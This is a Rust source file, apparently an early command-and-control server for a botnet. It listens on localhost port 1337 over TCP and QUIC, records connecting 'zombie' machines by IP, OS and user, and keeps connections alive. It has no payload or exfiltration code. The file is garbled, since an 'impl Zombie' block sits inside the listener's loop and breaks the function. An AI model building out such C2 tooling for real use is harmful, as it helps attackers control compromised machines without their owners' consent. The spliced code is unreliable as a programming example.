use std::{
    io::{BufWriter, Write, BufReader, BufRead},
    net::{TcpListener, TcpStream},
};
use serde::{Serialize,Deserialize};
use flume::{Receiver, Sender};
use s2n_quic::Connection;
use tokio::select;
pub async fn start(
    tx: Sender<String>,
    rx: Receiver<String>,
) -> Result<(), Box<dyn std::error::Error>> {
    let server = TcpListener::bind("127.0.0.1:1337")?;
    server.set_nonblocking(true)?;
    for stream in server.incoming() {
        let transmit = tx.clone();
        match stream {
            Ok(socket) => std::thread::spawn(move || {
                handle_tcp_connection(socket, transmit).unwrap();
            }),
            Err(_) => {
                match rx.try_recv() {
                    Ok(_) => break,
                    Err(_) => continue,
                };
            }
        };
impl Zombie {
    fn new(ip: String, os: String, user: String) -> Self {
        Self { ip, os, user }
    }
}
    }
    Ok(())
}

fn handle_tcp_connection(
    mut connect:  TcpStream,
    tx: Sender<String>,
) -> Result<(), Box<dyn std::error::Error>> {
    //Send notification to append connection to list.
    let mut stream = BufReader::new(&mut connect);
    let mut zombie = String::new();
    stream.read_line(&mut zombie)?;
    let add_connection = String::from("add ") + &zombie.to_string();
    tx.send(add_connection)?;
    let mut connection = BufWriter::new(connect.try_clone()?);
    // keeping the connection alive. This is for testing.
    loop {
        connection.write("hello".as_bytes())?;
        std::thread::sleep(std::time::Duration::from_secs(60));
        match connection.flush() {
            Ok(_) => continue,
            Err(_) => break,
        };
    }
    //Remove the connection from the list.
    let del_connection = String::from("del ") + &zombie.to_string();
    tx.send(del_connection)?;
    Ok(())
}

pub async fn start_quic(
    tx: Sender<String>,
    rx: Receiver<String>,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut quic_server = s2n_quic::Server::builder()
        .with_io("127.0.0.1:1337")?
        .start()?;

    loop {
        let transmit = tx.clone();
        select! {
        stream = quic_server.accept() => tokio::spawn(async move {handle_quic_connection(stream.unwrap(), transmit).await.unwrap()}),
        _ = rx.recv_async() => break,
         };
    }
    Ok(())
}

async fn handle_quic_connection(
    stream: Connection,
    tx: Sender<String>,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("we got it!");
    let add_connection = String::from("add ") + &stream.remote_addr()?.to_string();
    tx.send(add_connection)?;
    let del_connection = String::from("del ") + &stream.remote_addr()?.to_string();
    tx.send(del_connection)?;
    Ok(())
}
#[derive(Serialize, Deserialize, Debug, Clone)]
struct Zombie {
    ip: String,
    os: String,
    user: String,
}

